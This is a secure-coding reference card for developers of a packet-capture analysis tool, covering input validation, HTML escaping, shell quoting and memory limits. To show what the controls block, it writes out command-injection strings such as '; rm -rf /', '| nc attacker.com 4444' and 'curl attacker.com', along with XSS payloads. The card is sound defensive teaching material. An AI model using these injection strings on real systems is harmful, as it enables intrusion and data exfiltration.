# Security Controls Reference Card
## Quick Guide for Developers

This is a quick reference for the security controls implemented in v4.15.0.

---

## Golden Rules

### 1. NEVER Trust User Input

All data from PCAPs is **user-controlled**:
- IP addresses
- Port numbers
- Sequence/ACK numbers
- Packet payloads

**Always validate and escape before use.**

---

### 2. Defense in Depth

Use **multiple security layers**:

```
User Input → Validation → Escaping → Safe Usage
```

If one layer fails, the others provide backup.

---

### 3. Secure by Default

Security should be **automatic**, not optional:
- ✅ Always escape HTML
- ✅ Always validate IPs/ports
- ✅ Always quote shell commands
- ❌ Never bypass security for "convenience"

---

## Security Functions

### Input Validation

#### validate_ip_address(ip: str) → str

**Use when:** Processing IP addresses from packets

```python
from src.exporters.html_report import validate_ip_address

# GOOD: Validate before use
src_ip = validate_ip_address(packet_data['src_ip'])
tshark_filter = f"ip.src == {src_ip}"

# BAD: Direct use (injection risk)
src_ip = packet_data['src_ip']  # Could be "; rm -rf /"
tshark_filter = f"ip.src == {src_ip}"  # VULNERABLE!
```

**What it does:**
- Validates IPv4 and IPv6 addresses
- Returns "0.0.0.0" for invalid IPs
- Logs validation failures

**Blocks:**
- Command injection: `10.0.0.1; curl attacker.com`
- XSS: `<script>alert(1)</script>`

---

#### validate_port(port: str) → str

**Use when:** Processing port numbers from packets

```python
from src.exporters.html_report import validate_port

# GOOD: Validate before use
src_port = validate_port(packet_data['src_port'])

# BAD: Direct use (overflow risk)
src_port = packet_data['src_port']  # Could be 99999
```

**What it does:**
- Validates range 0-65535
- Returns "0" for invalid ports
- Logs validation failures

**Blocks:**
- Port overflow: `99999`
- Command injection: `80; curl attacker.com`

---

#### validate_flow_key_length(flow_key: str, max_length: int = 200) → bool

**Use when:** Accepting flow_key from analysis results

```python
from src.exporters.html_report import validate_flow_key_length

# GOOD: Check length before processing
if validate_flow_key_length(flow_key):
    html += f"<td>{escape_html(flow_key)}</td>"
else:
    logger.error(f"Flow key too long: {len(flow_key)} chars")
```

**What it does:**
- Limits flow_key to 200 characters
- Prevents DoS via large inputs

**Blocks:**
- HTML size explosion
- Browser DoS when viewing reports

---

### Output Escaping

#### escape_html(text: str) → str

**Use when:** Embedding ANY user data in HTML

```python
from src.exporters.html_report import escape_html

# GOOD: Escape before HTML
html += f"<td>{escape_html(flow_key)}</td>"

# BAD: Direct embedding (XSS risk)
html += f"<td>{flow_key}</td>"  # VULNERABLE!
```

**What it does:**
- Escapes `< > & " '` to HTML entities
- Makes HTML safe for browsers

**Blocks:**
- XSS via script tags: `<script>alert(1)</script>`
- XSS via event handlers: `<img onerror=alert(1)>`

**Critical locations:**
- ALL flow_key displays
- ALL tshark filter displays
- ALL packet data displays

---

#### shlex.quote(s: str) → str

**Use when:** Building shell commands

```python
import shlex

# GOOD: Quote shell arguments
safe_filter = shlex.quote(bpf_filter)
cmd = f"tshark -r input.pcap -Y {safe_filter}"

# BAD: Direct f-string (command injection)
cmd = f"tshark -r input.pcap -Y '{bpf_filter}'"  # VULNERABLE!
```

**What it does:**
- Wraps string in single quotes
- Escapes embedded single quotes
- Prevents shell interpretation

**Blocks:**
- Command injection: `; rm -rf /`
- Pipe operators: `| nc attacker.com 4444`
- Backtick substitution: `` `whoami` ``

---

## Common Patterns

### Pattern 1: Generating Tshark Commands

```python
import shlex
from src.exporters.html_report import validate_ip_address, validate_port

# Step 1: Validate inputs
src_ip = validate_ip_address(raw_src_ip)
dst_ip = validate_ip_address(raw_dst_ip)
src_port = validate_port(raw_src_port)
dst_port = validate_port(raw_dst_port)

# Step 2: Build filter
bpf_filter = f"ip.src == {src_ip} and ip.dst == {dst_ip} and tcp.srcport == {src_port}"

# Step 3: Quote for shell
safe_filter = shlex.quote(bpf_filter)

# Step 4: Build command
tshark_cmd = f"tshark -r input.pcap -Y {safe_filter}"

# ✅ SECURE: Validated inputs, quoted for shell
```

---

### Pattern 2: Rendering Flow Table in HTML

```python
from src.exporters.html_report import escape_html, validate_flow_key_length

for flow_key, retrans_list in flows:
    # Step 1: Validate length
    if not validate_flow_key_length(flow_key):
        logger.error(f"Flow key too long: {len(flow_key)}")
        continue

    # Step 2: Escape for HTML
    safe_flow_key = escape_html(flow_key)

    # Step 3: Embed in HTML
    html += f"<td>{safe_flow_key}</td>"

# ✅ SECURE: Length checked, HTML escaped
```

---

### Pattern 3: Displaying Packet Data

```python
from src.exporters.html_report import escape_html

# ALWAYS escape packet data before displaying
seq_num = packet.tcp.seq  # This is user-controlled!
safe_seq = escape_html(str(seq_num))
html += f"<td>Seq: {safe_seq}</td>"

# ✅ SECURE: Even though seq_num is numeric, defense in depth
```

---

## Anti-Patterns (DON'T DO THIS)

### ❌ Direct HTML Embedding

```python
# WRONG: No escaping
html += f"<td>{flow_key}</td>"

# RIGHT: Escape first
html += f"<td>{escape_html(flow_key)}</td>"
```

---

### ❌ Direct Command Building

```python
# WRONG: No quoting
cmd = f"tshark -r input.pcap -Y '{filter}'"

# RIGHT: Quote first
safe_filter = shlex.quote(filter)
cmd = f"tshark -r input.pcap -Y {safe_filter}"
```

---

### ❌ Assuming Data is Safe

```python
# WRONG: "Port numbers are always numeric, so no need to validate"
port = packet_data['src_port']
cmd = f"tshark -r input.pcap -Y 'tcp.srcport == {port}'"

# RIGHT: Validate anyway (defense in depth)
port = validate_port(packet_data['src_port'])
cmd = f"tshark -r input.pcap -Y 'tcp.srcport == {port}'"
```

---

### ❌ Bypassing Security for Convenience

```python
# WRONG: "I'll skip validation because I trust this PCAP"
src_ip = packet_data['src_ip']  # VULNERABLE!

# RIGHT: Always validate, even "trusted" data
src_ip = validate_ip_address(packet_data['src_ip'])
```

---

## Ring Buffer Configuration

### Memory Management Settings

```python
class RetransmissionAnalyzer:
    def __init__(self):
        # Max segments per flow (prevents unbounded growth)
        self._max_segments_per_flow = 10000  # ~160 KB per flow

        # Cleanup frequency (prevents memory spikes)
        self._cleanup_interval = 10000  # Every 10K packets

        # Cleanup keeps newest 50% of segments
```

**When to adjust:**
- **Higher limits:** Large datacenter captures (>1M packets)
- **Lower limits:** Embedded systems (limited RAM)
- **Never:** Disable cleanup (causes memory leaks)

---

## Testing Your Code

### Security Test Template

```python
def test_your_feature_xss():
    """Test that your feature escapes HTML."""
    from src.exporters.html_report import escape_html

    # Malicious input
    xss_payload = "<script>alert('xss')</script>"

    # Your code here
    result = your_function(xss_payload)

    # Verify HTML is escaped
    assert "<script>" not in result
    assert "&lt;script&gt;" in result
```

---

### Run Security Tests

```bash
# All security tests
python -m pytest tests/test_security_audit.py -v

# Proof-of-concept exploits
python tests/test_v415_security_poc.py
```

---

## When in Doubt

### Ask These Questions:

1. **Is this data from a PCAP?**
   → YES = User-controlled, validate it

2. **Am I embedding this in HTML?**
   → YES = Use escape_html()

3. **Am I building a shell command?**
   → YES = Use shlex.quote()

4. **Could this grow unbounded?**
   → YES = Add limits (like ring buffer)

---

## Examples from Codebase

### Good Example 1: Flow Trace Command Generation

```python
# Location: html_report.py, line 323-455
def _generate_flow_trace_command(self, flow_key: str) -> str:
    # ✅ Validate length
    if not validate_flow_key_length(flow_key):
        return "# Error: Flow key too long"

    # ✅ Parse and validate IPs
    src_ip = validate_ip_address(src_ip)
    dst_ip = validate_ip_address(dst_ip)

    # ✅ Validate ports
    src_port = validate_port(src_port)
    dst_port = validate_port(dst_port)

    # ✅ Build filter
    bpf_filter = f"ip.src == {src_ip} and ip.dst == {dst_ip} ..."

    # ✅ Quote for shell
    safe_bpf_filter = shlex.quote(bpf_filter)

    # ✅ Return safe command
    return f"tshark -r input.pcap -Y {safe_bpf_filter} ..."
```

---

### Good Example 2: Flow Table Rendering

```python
# Location: html_report.py, line 3296
html += f'<td ...>{escape_html(flow_key)}</td>'

# ✅ Always escapes flow_key before HTML embedding
```

---

### Good Example 3: Ring Buffer Cleanup

```python
# Location: retransmission.py, line 460-489
def _cleanup_old_segments(self):
    for flow_key in self._seen_segments.keys():
        segments = self._seen_segments[flow_key]
        if len(segments) > self._max_segments_per_flow:
            # ✅ Keep only newest 50%
            keep_count = self._max_segments_per_flow // 2
            self._seen_segments[flow_key] = dict(sorted_segments[:keep_count])

# ✅ Prevents unbounded memory growth
```

---

## Quick Reference Card

| Task | Function | Import |
|------|----------|--------|
| Validate IP | `validate_ip_address(ip)` | `from src.exporters.html_report import validate_ip_address` |
| Validate port | `validate_port(port)` | `from src.exporters.html_report import validate_port` |
| Check length | `validate_flow_key_length(key)` | `from src.exporters.html_report import validate_flow_key_length` |
| Escape HTML | `escape_html(text)` | `from src.exporters.html_report import escape_html` |
| Quote shell | `shlex.quote(arg)` | `import shlex` |

---

## Need Help?

1. **Security Questions:** security@example.com
2. **Code Review:** dev@example.com
3. **Full Audit Report:** `docs/security/SECURITY_AUDIT_v4.15.0.md`

---

**Remember:** Security is everyone's responsibility. When in doubt, validate and escape!

**Last Updated:** December 19, 2025
